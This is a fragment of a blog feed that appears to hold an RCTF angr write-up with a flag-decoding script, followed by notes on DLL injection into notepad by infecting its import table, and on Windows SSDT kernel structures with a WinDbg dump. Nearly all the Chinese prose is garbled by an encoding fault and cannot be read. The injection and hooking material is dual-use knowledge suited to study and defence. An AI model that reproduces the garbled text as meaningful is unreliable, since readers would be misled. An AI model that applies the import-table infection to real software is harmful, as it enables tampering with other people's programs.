0x80485c8   cmp [ebp-0x58],0x24------------|    |
0x80485cc   jnz 0x804853c ----------------------|

0x80485d2   mov eax,0x0
0x80485d7   mov ecx,[ebp-0x0C]
0x80485da   xor ecx,[x86g_use_seg_selector(t5,t6,t12,0x00000014)]
0x80485e1   cmp ecx,0x00;   je 0x80485e8;jmp out
0x80485e8   add esp,0x54
0x80485eb   mov ecx,[esp] ; add esp,0x04
0x80485ec   mov ebp,[esp]
0x80485ed   
0x80485f0   ret
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>äº†è§£åˆ°æ ˆé‡Œé¢ä¸åŒä½ç½®å¹²ä»€ä¹ˆç”¨äº†ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºçš„é€»è¾‘å°±æ˜¯ä½ç§»ä»¥åŠä¸€æ®µå–æ¨¡</p>
<p>è§£å¯†è„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">byte_stream <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span>
                <span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span>
                <span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span>
                <span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span>
                <span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>
                <span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span>
                <span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span>
                <span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span>
                <span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span>
                <span class="token number">0x64</span><span class="token punctuation">]</span>
<span class="token comment"># table = [0x41...0x5a]</span>
table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x41</span> <span class="token operator">+</span> num <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token operator">-</span><span class="token number">0x41</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i<span class="token punctuation">,</span>value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>byte_stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> value <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">&lt;=</span> <span class="token number">0x0000005a</span><span class="token punctuation">:</span>
        byte_stream<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value <span class="token operator">+</span> <span class="token number">3</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        t74 <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">+</span> value <span class="token operator">-</span> <span class="token number">0x5a</span>
        mul1 <span class="token operator">=</span> <span class="token punctuation">(</span>t74 <span class="token operator">*</span> <span class="token number">0x4ec4ec4f</span><span class="token punctuation">)</span> <span class="token operator">>></span><span class="token number">32</span>
        t20 <span class="token operator">=</span> mul1 <span class="token operator">>></span> <span class="token number">3</span>
        t27 <span class="token operator">=</span> <span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">-</span><span class="token number">0x5A</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">0x1f</span>
        mul2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t20 <span class="token operator">-</span> t27<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
        sub <span class="token operator">=</span> value <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x5A</span> <span class="token operator">-</span> mul2
        byte_stream<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> table<span class="token punctuation">[</span>sub<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>byte_stream<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># t20 = Sar32(from64HIto32(MullS32(from8to32(ch) + 0x00000003 - 0x5A,0x4ec4ec4f)),0x03)</span>
<span class="token comment"># t27 = Sar32(from8to32(ch) + 0x00000003 - 0x5A,0x1f)</span>
<span class="token comment"># load_ch(ebp + Sub32(from8to32(ch) + 0x00000003 - 0x5A,Mul32(Sub32(t20,t27),0x0000001a)) - 0x00000001 - 0x4C)</span>

<span class="token comment"># 2**35 / 0x4ec4ec4f = 25L</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>ç¬¦å·æ‰§è¡Œ</category>
        <category>Angr</category>
        <category>RCTF</category>
      </categories>
      <tags>
        <tag>ç¬¦å·æ‰§è¡Œ</tag>
        <tag>angr</tag>
        <tag>ç•™å‘</tag>
        <tag>WP</tag>
        <tag>RCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dll INJECTION &amp;&amp; HOOK</title>
    <url>/2021/05/22/dll_injection_hook/</url>
    <content><![CDATA[<h1 id="DLL-INJECTION-amp-amp-HOOK"><a href="#DLL-INJECTION-amp-amp-HOOK" class="headerlink" title="DLL INJECTION &amp;&amp; HOOK"></a>DLL INJECTION &amp;&amp; HOOK</h1><blockquote>
<p>ã€Šå…³äºæˆ‘ä¸€æœ¬ä¹¦çœ‹åˆ°ä¸€åŠå´å’•äº†ä¸€ä¸ªå­¦æœŸè¿™ä»¶äº‹ã€‹</p>
</blockquote>
<p>ç²—ç•¥çš„çœ‹äº†ä¸€ä¸‹ï¼Œdll injection å’Œ hook å‘ç°è¿™ä¿©åº”è¯¥æ˜¯å¾—æ”¾ä¸€èµ·çš„ï¼Œå› ä¸ºæ¶‰åŠçš„çŸ¥è¯†æ¯”è¾ƒéš¾åšåˆ†éš”ï¼Œæˆ–è€…è¯´åŸºç¡€çŸ¥è¯†å¾ˆæ˜¯æ¥è¿‘ï¼Œè¶Šæ˜¯äº†è§£ï¼Œå°±ä¼šå‘ç°è¶Šè¦äº†è§£ windows çš„ loader æœºåˆ¶ï¼Œwindows çš„ä¸€äº›è¾ƒä¸ºæœ‰ç”¨çš„ api ï¼Œç”šè‡³æ˜¯ windows çš„å†…æ ¸æ•°æ®ç»“æ„ï¼Œç›´æ¥æ·±å…¥ windows çš„ r0 è¿˜æ˜¯æ¯”è¾ƒçŒ›çš„ã€‚</p>
<p>ä¹Ÿå› æ­¤è¿™ç¯‡æ–‡ç« æ³¨å®šæ˜¯éšç€æˆ‘çš„å­¦ä¹ ä¸æ–­æ›´æ–°çš„ã€‚</p>
<h2 id="1-ä½¿ç”¨æ‹“å±•æœ€åä¸€ä¸ªèŠ‚åŒºè¿›è¡Œæ³¨å…¥å·²ç»å†™å¥½çš„çš„DLL"><a href="#1-ä½¿ç”¨æ‹“å±•æœ€åä¸€ä¸ªèŠ‚åŒºè¿›è¡Œæ³¨å…¥å·²ç»å†™å¥½çš„çš„DLL" class="headerlink" title="1.ä½¿ç”¨æ‹“å±•æœ€åä¸€ä¸ªèŠ‚åŒºè¿›è¡Œæ³¨å…¥å·²ç»å†™å¥½çš„çš„DLL"></a>1.ä½¿ç”¨æ‹“å±•æœ€åä¸€ä¸ªèŠ‚åŒºè¿›è¡Œæ³¨å…¥å·²ç»å†™å¥½çš„çš„DLL</h2><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-22_23-28-12.jpg" alt="Snipaste_2021-09-22_23-28-12"></p>
<p>è¿™ä¸ªåœ¨è¿è¡Œè¢«æ³¨å…¥çš„ notepad çš„è¿‡ç¨‹ä¸­ï¼ŒDLL ä¸­çš„ Msg å¹¶ä¸ä¼šè¿è¡Œï¼Œåªæ˜¯é€šè¿‡ dllenterpoint å‡½æ•°æ‰§è¡Œäº† dllmain ï¼Œåè€…è°ƒç”¨äº† msgboxï¼Œå¼¹å‡ºä¸€ä¸ªmsgbox çª—ä½“ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-23_01-08-25.jpg" alt="Snipaste_2021-09-23_01-08-25"></p>
<p>text ä¸­çš„ 0x7800 -&gt; 0x7748 ä¹Ÿå°±æ˜¯è‚¯å®šæ²¡æœ‰ 7800 é‚£ä¹ˆå¤šæ•°æ®ï¼Œå› æ­¤åé¢çš„å¯ä»¥å†™å…¥çš„å°±æ˜¯ 0x7800-0x7748ã€‚ä¸è¿‡ä¸å¤Ÿæˆ‘è¦çš„ IIT å°±æ˜¯äº†ã€‚<br>åˆ†æç»™çš„ notepad å¯ä»¥çŸ¥é“ ï¼Œä¸ºäº†ä¸å½±å“ç¨‹åºçš„æ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ IITç»“æ„ä¿®æ”¹å¹¶è½¬ç§»åˆ°åˆ«çš„åœ°æ–¹å­˜å‚¨ï¼ŒIIT å­˜å‚¨çš„å…³é”®å°±åªæœ‰ OriginalFirstThunk,FirstThunk,Nameã€‚æˆ‘ä»¬åªè¦æŠŠ optional_header ä¸­çš„ Data Directory ä¸­çš„ Immport Directory æŒ‡å‘æˆ‘ä»¬è‡ªå·±çš„æ•°æ®å³å¯ï¼Œæ²¡æœ‰æ•°æ®å°±åˆ›é€ åŒºåŸŸã€‚æ²¡æœ‰ç©ºé—´å°±ä¿®æ”¹ section_header ä¸­çš„ raw size,æœ€åå†™åˆ°æœ€æœ«å°¾ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-23_01-24-02.jpg" alt="Snipaste_2021-09-23_01-24-02"></p>
<p>ç”±äºç¨‹åºå¯ç”¨äº†ç»‘å®šè¾“å…¥ã€‚ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ä¼šä»¥ä¸ºdllçš„å‡½æ•°åŠ è½½åˆ°äº†æ­£ç¡®çš„è™šæ‹Ÿåœ°å€ä¸­ï¼Œç„¶è€Œæˆ‘è‡ªå·±çš„dllä¼¼ä¹ä¸èƒ½å»¶è¿Ÿç»‘å®šï¼ˆä¼¼ä¹ä¹Ÿå¯ä»¥çš„æ ·å­ï¼Œç ”ç©¶ä¸€æ³¢ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-23_01-27-08.jpg" alt="Snipaste_2021-09-23_01-27-08"></p>
<p>æˆ‘ä»¬å¯ä»¥è¦†ç›– 0x1B0 çš„åœ°å€å’Œå¤§å°ä¸ºé›¶ï¼Œé¡ºå¸¦ä¹Ÿå¯ä»¥åˆ æ‰ 0x250 0xD0é•¿åº¦çš„{TimeDateStamp:DWORD;offsetModuleName:WORD;NumberOfModuleForwarderRefs:WORD}ç»“æ„ä½“æ•°ç»„</p>
<p>è¿˜æœ‰å¯èƒ½è¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯ FirstTrunk ä¹Ÿè¦æŒ‡å‘ IMAGE_IMPORT_BY_NAME</p>
<h2 id="2-è¿›ç¨‹åˆ›å»ºæœŸé—´ä¿®æ”¹PEè¾“å…¥è¡¨"><a href="#2-è¿›ç¨‹åˆ›å»ºæœŸé—´ä¿®æ”¹PEè¾“å…¥è¡¨" class="headerlink" title="2.è¿›ç¨‹åˆ›å»ºæœŸé—´ä¿®æ”¹PEè¾“å…¥è¡¨"></a>2.è¿›ç¨‹åˆ›å»ºæœŸé—´ä¿®æ”¹PEè¾“å…¥è¡¨</h2><p>ä»¥æŒ‚èµ·è¿›ç¨‹åˆ›å»ºè¿™ä¸ªè¿›ç¨‹ dwCreationFlag<br>æœç´¢è™šæ‹Ÿå†…å­˜ä¸­çš„é•œåƒåœ°å€<br>åˆ›å»ºæ–°èŠ‚åŒºï¼Œåœ¨è™šæ‹Ÿå†…å­˜ä¸­ç›´æ¥åˆ†é…å°±å¥½äº†<br>ä¿®æ”¹ OptionalHeader ä¸­çš„ ImportDictionary æŒ‡å‘è‡ªå·±çš„æ–°åœ°å€<br>ç§»æ¤ IID åˆ°æ–°èŠ‚ï¼Œæ–°DLLæ‰€éœ€è¦ çš„ INTï¼ŒIATï¼ŒIMAGE_IMPORT_BY_NAME<br>å†æœ‰åˆ æ‰è¾“å…¥ç»‘å®š</p>
<p>å¯ä»¥é€šè¿‡é¡¹ç›®çš„æ—¥å¿—çœ‹çš„æ›´æ¸…æ¥š</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Path <span class="token operator">=</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ImageBase <span class="token operator">=</span> 0x00400000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PEå¤´è¯»å–æˆåŠŸ<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> å½“å‰å¯¼å…¥è¡¨ä¿¡æ¯ VA <span class="token operator">=</span> 0x000064CC Size <span class="token operator">=</span> 0x28
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> dwOldIIDCnt <span class="token operator">=</span> <span class="token number">2</span>  Size <span class="token operator">=</span> 0x28
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> dwNewIIDCnt <span class="token operator">=</span> <span class="token number">3</span>  Size <span class="token operator">=</span> 0x3C
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> å¯¼å…¥è¡¨æ‰€åœ¨èŠ‚  .rdata  RawOffset <span class="token operator">=</span> 0x6000 Size <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> æ–°èŠ‚æ·»åŠ å®Œæ¯•<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NewSection VA <span class="token operator">=</span> 0x410000 VirtualSize <span class="token operator">=</span> 0x1000 RawSize <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> åŸå¯¼å…¥è¡¨IIDç»“æ„ä¿å­˜å®Œæ¯•.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> æ–°å¯¼å…¥è¡¨IIDå­ç»“æ„æ„é€ å®Œæ¯•.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> æ–°IIDæˆå‘˜å ç”¨çš„ç©ºé—´å¤§å° <span class="token operator">=</span> 0x22
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> æ–°IIDå¡«å……å®Œæ¯•.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PEå¤´æ›´æ–°å®Œæ¯•.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> å¼€å§‹æ›´æ–°å†…å­˜ä¸­çš„PEæ•°æ®.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> å‡†å¤‡å†™å…¥PEå¤´: StartAddress <span class="token operator">=</span> 0x00400000 Size <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PEå¤´å†™å…¥å®Œæ¯•.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> å‡†å¤‡å†™å…¥IIDä¿¡æ¯: StartAddress <span class="token operator">=</span> 0x0041003C Size <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> æ–°IIDé¡¹çš„å­ç»“æ„å†™å…¥å®Œæ¯•. Add <span class="token operator">=</span> 0x1003C Size <span class="token operator">=</span> 0x22
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> æ–°å¯¼å…¥è¡¨æ•´ä½“å†™å…¥å®Œæ¯•. Offset <span class="token operator">=</span> 0x1003C Size <span class="token operator">=</span> 0x22
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> å¯¼å…¥è¡¨æ„ŸæŸ“å®Œæ¯•.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-24_10-51-19.jpg" alt="Snipaste_2021-09-24_10-51-19"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-24_10-51-29.jpg" alt="Snipaste_2021-09-24_10-51-29"></p>
<p>æˆ‘ä¸ªäººè§‚ç‚¹ï¼Œæœ¬é¡¹ç›®çš„é‡ç‚¹åœ¨äºè§£æ IMAGE,è¿˜æœ‰ä¸€äº›è‡ªå·±ä¸ç†Ÿæ‚‰çš„ WINAPIï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆéå¸¸æ–°é¢–çš„æ€è·¯ï¼Œæ¯”èµ·ç¬¬ä¸€ä¸ªå°±åªæ˜¯æŠŠ PE åˆ›å»ºæ—¶ suspend äº†ï¼Œè¿˜æœ‰ç›´æ¥åˆ†é…å†…å­˜ç»™è‡ªå·±æ³¨å…¥ IIDï¼Œåé¢å°±å’Œæˆ‘è‡ªå·±çš„åšæ³•ä¸€æ ·äº†ã€‚ä½œè€…å†™å‡ºè¿™ä¸ªè„šæœ¬è¿˜æ˜¯å¾ˆå¼ºçš„ã€‚</p>
<p>è‡ªå·±æ°´å¹³æœ‰é™ï¼Œè¿˜ä¸èƒ½æ¯”è¾ƒå¥½çš„å†™å‡ºè¿™ç§è„šæœ¬ï¼Œä¸‹æ¬¡ä¸€å®šã€‚</p>
<h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><h1 id="win-å†…æ ¸"><a href="#win-å†…æ ¸" class="headerlink" title="win å†…æ ¸"></a>win å†…æ ¸</h1><h2 id="win-å†…æ ¸æ•°æ®ç»“æ„"><a href="#win-å†…æ ¸æ•°æ®ç»“æ„" class="headerlink" title="win å†…æ ¸æ•°æ®ç»“æ„"></a>win å†…æ ¸æ•°æ®ç»“æ„</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tagSERVICE_DESCRIPTOR_TABLE</span> <span class="token punctuation">&#123;</span>
    SYSTEM_SERVICE_TABLE nt<span class="token punctuation">;</span> <span class="token comment">//effectively a pointer to Service Dispatch Table (SSDT) itself</span>
    SYSTEM_SERVICE_TABLE win32k<span class="token punctuation">;</span>
    SYSTEM_SERVICE_TABLE sst3<span class="token punctuation">;</span> <span class="token comment">//pointer to a memory address that contains how many routines are defined in the table</span>
    SYSTEM_SERVICE_TABLE sst4<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> SERVICE_DESCRIPTOR_TABLE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lkd<span class="token operator">></span> dps nt<span class="token operator">!</span>keservicedescriptortable l4
fffff802<span class="token variable"><span class="token variable">`</span>532018c0  fffff802<span class="token variable">`</span></span>524c8340 nt<span class="token operator">!</span>KiServiceTable
fffff802<span class="token variable"><span class="token variable">`</span>532018c8  00000000<span class="token variable">`</span></span>00000000
fffff802<span class="token variable"><span class="token variable">`</span>532018d0  00000000<span class="token variable">`</span></span>000001d7
fffff802<span class="token variable"><span class="token variable">`</span>532018d8  fffff802<span class="token variable">`</span></span>524c8aa0 nt<span class="token operator">!</span>KiArgumentTable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="SSDT-system-service-descriptor-table"><a href="#SSDT-system-service-descriptor-table" class="headerlink" title="SSDT (system service descriptor table)"></a>SSDT (system service descriptor table)</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lkd&gt; .foreach &#x2F;ps 1 &#x2F;pS 1 ( offset &#123;dd &#x2F;c 1 nt!KiServiceTable L poi(nt!KeServiceDescriptorTable+10)&#125;)&#123; r $t0 &#x3D; ( offset &gt;&gt;&gt; 4) + nt!KiServiceTable; .printf &quot;%p - %y\n&quot;, $t0, $t0 &#125;
fffff80252739f60 - nt!NtAccessCheck (fffff802&#96;52739f60)
fffff80252745450 - nt!NtWorkerFactoryWorkerReady (fffff802&#96;52745450)
fffff80252b06660 - nt!NtAcceptConnectPort (fffff802&#96;52b06660)
fffff80252cd3cd0 - nt!NtMapUserPhysicalPagesScatter (fffff802&#96;52cd3cd0)
fffff802529f75b0 - nt!NtWaitForSingleObject (fffff802&#96;529f75b0)
fffff802527fab00 - nt!NtCallbackReturn (fffff802&#96;527fab00)
fffff80252a8bae0 - nt!NtReadFile (fffff802&#96;52a8bae0)
fffff80252a745a0 - nt!NtDeviceIoControlFile (fffff802&#96;52a745a0)
fffff80252a8aeb0 - nt!NtWriteFile (fffff802&#96;52a8aeb0)
fffff80252ad67b0 - nt!NtRemoveIoCompletion (fffff802&#96;52ad67b0)
fffff80252ad5060 - nt!NtReleaseSemaphore (fffff802&#96;52ad5060)
fffff80252a89230 - nt!NtReplyWaitReceivePort (fffff802&#96;52a89230)
fffff80252a2dab0 - nt!NtReplyPort (fffff802&#96;52a2dab0)
fffff80252a73480 - nt!NtSetInformationThread (fffff802&#96;52a73480)
fffff80252a72b70 - nt!NtSetEvent (fffff802&#96;52a72b70)
fffff802529f72e0 - nt!NtClose (fffff802&#96;529f72e0)
fffff80252a5f310 - nt!NtQueryObject (fffff802&#96;52a5f310)
fffff80252a77a00 - nt!NtQueryInformationFile (fffff802&#96;52a77a00)
fffff80252ae2a50 - nt!NtOpenKey (fffff802&#96;52ae2a50)
fffff802529e8e00 - nt!NtEnumerateValueKey (fffff802&#96;529e8e00)
fffff80252a02080 - nt!NtFindAtom (fffff802&#96;52a02080)
fffff80252ab4940 - nt!NtQueryDefaultLocale (fffff802&#96;52ab4940)
fffff80252a94d20 - nt!NtQueryKey (fffff802&#96;52a94d20)
fffff80252a953c0 - nt!NtQueryValueKey (fffff802&#96;52a953c0)
fffff80252ab60e0 - nt!NtAllocateVirtualMemory (fffff802&#96;52ab60e0)
fffff80252a61850 - nt!NtQueryInformationProcess (fffff802&#96;52a61850)
fffff80252ae3130 - nt!NtWaitForMultipleObjects32 (fffff802&#96;52ae3130)
fffff80252aebe60 - nt!NtWriteFileGather (fffff802&#96;52aebe60)
fffff80252a9fb80 - nt!NtSetInformationProcess (fffff802&#96;52a9fb80)
fffff80252a519a0 - nt!NtCreateKey (fffff802&#96;52a519a0)
fffff802529f8ad0 - nt!NtFreeVirtualMemory (fffff802&#96;529f8ad0)
fffff80252cbeda0 - nt!NtImpersonateClientOfPort (fffff802&#96;52cbeda0)
fffff80252a72a60 - nt!NtReleaseMutant (fffff802&#96;52a72a60)
fffff80252a7e5a0 - nt!NtQueryInformationToken (fffff802&#96;52a7e5a0)
fffff80252aed0a0 - nt!NtRequestWaitReplyPort (fffff802&#96;52aed0a0)
fffff802529ff3b0 - nt!NtQueryVirtualMemory (fffff802&#96;529ff3b0)
fffff80252a662b0 - nt!NtOpenThreadToken (fffff802&#96;52a662b0)
fffff80252a882a0 - nt!NtQueryInformationThread (fffff802&#96;52a882a0)
fffff80252ad1fc0 - nt!NtOpenProcess (fffff802&#96;52ad1fc0)
fffff8025268fda0 - nt!NtSetInformationFile (fffff802&#96;5268fda0)
fffff802529fe690 - nt!NtMapViewOfSection (fffff802&#96;529fe690)
fffff80252a26bf0 - nt!NtAccessCheckAndAuditAlarm (fffff802&#96;52a26bf0)
fffff80252afc470 - nt!NtUnmapViewOfSection (fffff802&#96;52afc470)
fffff80252a89250 - nt!NtReplyWaitReceivePortEx (fffff802&#96;52a89250)
fffff80252ab3900 - nt!NtTerminateProcess (fffff802&#96;52ab3900)
fffff80252d4c1c0 - nt!NtSetEventBoostPriority (fffff802&#96;52d4c1c0)
fffff80252aeb850 - nt!NtReadFileScatter (fffff802&#96;52aeb850)
fffff80252a662d0 - nt!NtOpenThreadTokenEx (fffff802&#96;52a662d0)
fffff80252a66a90 - nt!NtOpenProcessTokenEx (fffff802&#96;52a66a90)
fffff80252aae9b0 - nt!NtQueryPerformanceCounter (fffff802&#96;52aae9b0)
fffff80252a72420 - nt!NtEnumerateKey (fffff802&#96;52a72420)
fffff80252a155c0 - nt!NtOpenFile (fffff802&#96;52a155c0)
fffff80252a96c40 - nt!NtDelayExecution (fffff802&#96;52a96c40)
fffff80252af2300 - nt!NtQueryDirectoryFile (fffff802&#96;52af2300)
fffff80252a8e9c0 - nt!NtQuerySystemInformation (fffff802&#96;52a8e9c0)
fffff80252ae2120 - nt!NtOpenSection (fffff802&#96;52ae2120)
fffff80252d4bfb0 - nt!NtQueryTimer (fffff802&#96;52d4bfb0)
fffff80252ae24e0 - nt!NtFsControlFile (fffff802&#96;52ae24e0)
fffff80252b010c0 - nt!NtWriteVirtualMemory (fffff802&#96;52b010c0)
fffff80252af0aa0 - nt!NtCloseObjectAuditAlarm (fffff802&#96;52af0aa0)
fffff802529e8200 - nt!NtDuplicateObject (fffff802&#96;529e8200)
fffff80252a16450 - nt!NtQueryAttributesFile (fffff802&#96;52a16450)
fffff80252adad70 - nt!NtClearEvent (fffff802&#96;52adad70)
fffff802529ea650 - nt!NtReadVirtualMemory (fffff802&#96;529ea650)
fffff80252ae7c50 - nt!NtOpenEvent (fffff802&#96;52ae7c50)
fffff80252a180f0 - nt!NtAdjustPrivilegesToken (fffff802&#96;52a180f0)
fffff80252a2b540 - nt!NtDuplicateToken (fffff802&#96;52a2b540)
fffff802527f78f0 - nt!NtContinue (fffff802&#96;527f78f0)
fffff80252b7c0e0 - nt!NtQueryDefaultUILanguage (fffff802&#96;52b7c0e0)
fffff80252ab3ac0 - nt!NtQueueApcThread (fffff802&#96;52ab3ac0)
fffff802526f1480 - nt!NtYieldExecution (fffff802&#96;526f1480)
fffff80252d53990 - nt!NtAddAtom (fffff802&#96;52d53990)
fffff80252a78db0 - nt!NtCreateEvent (fffff802&#96;52a78db0)
fffff80252a8e3a0 - nt!NtQueryVolumeInformationFile (fffff802&#96;52a8e3a0)
fffff802529fa5f0 - nt!NtCreateSection (fffff802&#96;529fa5f0)
fffff80252ae7810 - nt!NtFlushBuffersFile (fffff802&#96;52ae7810)
fffff80252a60f60 - nt!NtApphelpCacheControl (fffff802&#96;52a60f60)
fffff80252d03ed0 - nt!NtCreateProcessEx (fffff802&#96;52d03ed0)
fffff80252d03f70 - nt!NtCreateThread (fffff802&#96;52d03f70)
fffff80252a57660 - nt!NtIsProcessInJob (fffff802&#96;52a57660)
fffff80252a96600 - nt!NtProtectVirtualMemory (fffff802&#96;52a96600)
fffff80252af9150 - nt!NtQuerySection (fffff802&#96;52af9150)
fffff80252ab2940 - nt!NtResumeThread (fffff802&#96;52ab2940)
fffff80252ab3270 - nt!NtTerminateThread (fffff802&#96;52ab3270)
fffff80252cbeea0 - nt!NtReadRequestData (fffff802&#96;52cbeea0)
fffff80252a15630 - nt!NtCreateFile (fffff802&#96;52a15630)
fffff80252afda30 - nt!NtQueryEvent (fffff802&#96;52afda30)
fffff80252cbf020 - nt!NtWriteRequestData (fffff802&#96;52cbf020)
fffff80252ae2050 - nt!NtOpenDirectoryObject (fffff802&#96;52ae2050)
fffff80252a26b40 - nt!NtAccessCheckByTypeAndAuditAlarm (fffff802&#96;52a26b40)
fffff80252d48a30 - nt!NtQuerySystemTime (fffff802&#96;52d48a30)
